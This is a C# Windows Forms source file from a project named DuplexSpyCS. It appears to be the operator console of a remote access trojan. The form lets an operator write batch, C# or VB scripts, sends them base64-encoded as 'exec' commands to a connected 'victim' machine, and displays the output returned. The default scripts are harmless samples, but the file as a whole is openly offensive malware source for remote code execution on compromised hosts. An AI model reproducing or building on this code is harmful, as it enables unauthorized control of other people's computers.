using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ICSharpCode.TextEditor;

namespace DuplexSpyCS
{
    public partial class frmRunScript : Form
    {
        public clsVictim v { get; init; }

        private TextEditorControl editor_code = new TextEditorControl();
        private List<string> m_lsScript = new List<string>
        {
            "bat", "cs", "vb",
        };
        private Dictionary<string, string> m_dicDefaultCode = new Dictionary<string, string>()
        {
            {
                "bat",
        @"@echo off
echo Hello, World!"
            },
            {
                "cs",
        @"using System;

class Program
{
    static void Main(string[] args)
    {
        Console.WriteLine(""Hello, World!"");
    }
}"
            },
            {
                "vb",
                @"Imports System

Module Program
    Sub Main(args As String())
        Console.WriteLine(""Hello World!"")
    End Sub
End Module"
            }
        };

        public frmRunScript(clsVictim victim)
        {
            InitializeComponent();

            v = victim;
        }

        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!clsTools.fnbVictimEquals(victim, v))
                return;

            if (lsMsg[0] == "exec")
            {
                if (new string[] { "bat", "cs", "vb" }.Contains(lsMsg[1]))
                {
                    int code = int.Parse(lsMsg[2]);
                    string output = clsCrypto.b64D2Str(lsMsg[3]);

                    DisplayOutput(code, output);
                }
            }
        }

        private void DisplayOutput(int code, string output)
        {
            try
            {
                if (code == 0)
                {
                    throw new Exception(output);
                }

                Invoke(new Action(() =>
                {
                    richTextBox1.Text = output;
                }));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        void setup()
        {
            if (editor_code == null)
                editor_code = new TextEditorControl();

            tabControl1.TabPages[0].Controls.Add(editor_code);
            editor_code.Dock = DockStyle.Fill;

            comboBox1.SelectedIndex = 1;
            comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;

            v.m_listener.ReceivedDecoded += fnRecv;
        }

        private void frmRunScript_Load(object sender, EventArgs e)
        {
            setup();
        }

        //RUN SCRIPT
        private void button1_Click(object sender, EventArgs e)
        {
            tabControl1.SelectedIndex = 1;

            string method = string.Empty;
            switch (comboBox1.SelectedIndex)
            {
                case 0:
                    method = "bat";
                    break;
                case 1:
                    method = "cs";
                    break;
                case 2:
                    method = "vb";
                    break;
            }

            v.SendCommand($"exec|{method}|{clsCrypto.b64E2Str(editor_code.Text)}|{clsCrypto.b64E2Str(textBox1.Text)}");
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            editor_code.Text = string.IsNullOrEmpty(editor_code.Text) ? m_dicDefaultCode[m_lsScript[comboBox1.SelectedIndex]] : editor_code.Text;
        }

        private void frmRunScript_FormClosed(object sender, FormClosedEventArgs e)
        {
            v.m_listener.ReceivedDecoded -= fnRecv;
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Function\\RunScript").Show();
        }

        private void tabControl1_KeyDown(object sender, KeyEventArgs e)
        {
            if (tabControl1.SelectedIndex == 0)
            {
                editor_code.Text = m_dicDefaultCode[m_lsScript[comboBox1.SelectedIndex]];
                editor_code.Refresh();
            }
        }
    }
}
